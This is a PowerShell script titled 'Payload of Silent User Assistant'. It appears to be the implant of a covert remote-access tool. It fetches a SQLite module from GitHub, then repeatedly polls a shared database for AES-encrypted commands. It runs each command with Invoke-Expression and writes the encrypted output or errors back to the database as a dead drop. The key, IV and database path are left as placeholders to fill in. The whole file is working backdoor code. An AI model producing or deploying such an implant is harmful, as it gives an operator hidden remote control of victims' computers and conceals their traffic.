
# Payload of Silent User Assistant
# Payload Stable Version 0.2

Clear-Host

$Global:ProgressPreference  = 'SilentlyContinue'

# $scriptPath             = (Get-Item $MyInvocation.MyCommand.Path).DirectoryName
# $scriptFileNoExt        = (Get-Item $MyInvocation.MyCommand.Path).BaseName
# $scriptFullPath         = (Get-Item $MyInvocation.MyCommand.Path).FullName
$ps_sql_module_path     = "$env:LOCALAPPDATA\Temp\SQL\PSSQLite-master\PSSQLite\PSSQLite.psd1"
$query_insert_record    = "INSERT INTO SUA (uname, record) VALUES ('Console', '@2')"
$query_read_last_record = "SELECT * FROM SUA ORDER BY id DESC LIMIT 1"
$database               = "@path"


function logging ($log)
{
    $time_log = Get-Date -Format 'HH:mm:ss'
    Write-Host "[$time_log]: $log"
}


function encrypt($string)
{
    $AESCipher            = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $AESCipher.Key        = "@key"
    $AESCipher.IV         = "@iv"
    $MySecretText         = $string
    $UnencryptedBytes     = [System.Text.Encoding]::UTF8.GetBytes($MySecretText)
    $Encryptor            = $AESCipher.CreateEncryptor()
    $EncryptedBytes       = $Encryptor.TransformFinalBlock($UnencryptedBytes, 0, $UnencryptedBytes.Length)
    [byte[]] $FullData    = $AESCipher.IV + $EncryptedBytes
    $CipherText           = [System.Convert]::ToBase64String($FullData)
    $AESCipher.Dispose()
    return $CipherText
}


function decrypt ($string) 
{
    $AESCipher            = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $AESCipher.Key        = "@key"
    $EncryptedBytes       = [System.Convert]::FromBase64String($string)
    $AESCipher.IV         = $EncryptedBytes[0..15]
    $Decryptor            = $AESCipher.CreateDecryptor();
    $UnencryptedBytes     = $Decryptor.TransformFinalBlock($EncryptedBytes, 16, $EncryptedBytes.Length - 16)
    $MySecretText         = [System.Text.Encoding]::UTF8.GetString($UnencryptedBytes)
    $AESCipher.Dispose()
    return $MySecretText
}


function setup () 
{
    if (-Not(Test-Path -Path "$ps_sql_module_path"))
    {
        logging "Waiting connection..."
        while (-Not((Test-NetConnection "github.com")).PingSucceeded) { 
            Start-Sleep -Seconds 10 
        }

        logging "Downloading the SQL module..."
        Invoke-WebRequest -Uri "https://github.com/RamblingCookieMonster/PSSQLite/archive/refs/heads/master.zip" -OutFile "$env:LOCALAPPDATA\Temp\SQL.zip"

        logging "Unzipping the SQL module..."
        Expand-Archive -LiteralPath "$env:LOCALAPPDATA\Temp\SQL.zip" -DestinationPath "$env:LOCALAPPDATA\Temp\SQL"
    }
    logging "Importing the SQL module..."
    Import-Module $ps_sql_module_path -ErrorAction Stop
    logging "SQL module has been imported"
}


function sql_executer ($query) 
{
    try {
        Invoke-SqliteQuery -DataSource $database -Query $query -ErrorAction Stop
    } catch {       
        sql_executer $query_insert_record.Replace("@2", "Error found during sending last command")
    }
}


function sql_send_notify_computer_connected () 
{
    logging "Sending a notification to DB..."
    sql_executer $query_insert_record.Replace("@2", "_UP!")
    $global:command_history += (sql_executer $query_read_last_record).id
    logging "Notification sent"
}


function create_sqlite_database ()
{
    if (-Not(Test-Path $database))
    {
        logging "Spawning the database..."
        sql_executer "CREATE TABLE SUA (id INTEGER PRIMARY KEY NOT NULL, uname TEXT, record TEXT);"
    }
}


function main ()
{
    $wait = 1000
    while (Test-Path -Path "$database") {
        $request_to_db = sql_executer $query_read_last_record

        $get_user   = $request_to_db.uname
        $get_record = $request_to_db.record

        if (-Not($get_user -like "Console")) 
        {
            try {
                logging "# Command received"

                logging "Decrypting command..."
                $get_record = decrypt $get_record
                
                $cmd_executed = $(Invoke-Expression -Command $get_record)
                logging "The command was executed and the output was captured"

                if ($cmd_executed.Length -eq 0) {
                    logging "Sending noOutput to connection point..."

                    sql_executer $query_insert_record.Replace("@2", "COMMAND_COMPLETE")
                    logging "The output has been sent"
                } 
                elseif ($cmd_executed.Length -gt 0) {
                    logging "The output is being converted to a string..."
                    $command_output = $cmd_executed | Out-String
                    
                    logging "Encrypting output..."
                    $command_output = encrypt $command_output

                    logging "Sending output to the connection point..."
                    sql_executer $query_insert_record.Replace("@2", "$command_output")
                    logging "The output has been sent"
                }
            } 
            catch {
                $errore = $Error[0]
                logging "[Error] $errore"

                logging "Encrypting Error..."
                $errore = encrypt $errore

                logging "Sending the error to the connection point ..."
                sql_executer $query_insert_record.Replace("@2", "$errore")
                logging "The error was sent"
            }      
            $wait = 1000
        }

        Start-Sleep -MilliSeconds $wait
        $wait += 100
    }
}

# ordered commands
setup
create_sqlite_database
sql_send_notify_computer_connected
main
